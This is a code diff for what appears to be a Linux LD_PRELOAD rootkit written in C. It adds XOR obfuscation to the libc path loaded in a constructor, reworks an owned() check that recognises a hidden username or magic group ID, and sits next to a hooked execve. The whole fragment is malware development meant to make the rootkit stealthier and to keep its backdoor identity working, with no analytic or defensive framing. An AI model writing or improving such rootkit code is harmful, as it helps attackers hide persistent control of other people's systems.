@@ -36,8 +36,11 @@ int owned(void)
 	char *user = strdup(USER); xor(user); 
 	int x;
 	struct passwd pwent; 
-	struct passwd *pwentp; 
-	if (pwentp != NULL)
+	struct passwd *pwp;
+	char buf[1024];
+	// need to improve this later
+	getpwuid_r(getuid(), &pwent, buf, sizeof(buf), &pwp);
+	if (pwp != NULL)
 	{ 
 		if ((strcmp(pwent.pw_name, user) == 0) || (getgid() == MAGICGID))
 		{ 
@@ -64,7 +67,9 @@ __attribute__ ((constructor)) static void init(void)
 	#ifdef DEBUG
 	printf("[rk] loaded: \n");
 	#endif
-	libc = dlopen(LIBC, RTLD_LAZY);
+	char *path = strdup(LIBC); xor(path); 
+	libc = dlopen(path, RTLD_LAZY);
+	CLEAN(path); 
 }
 
 int execve(const char *path, char *const argv[], char *const envp[]) 
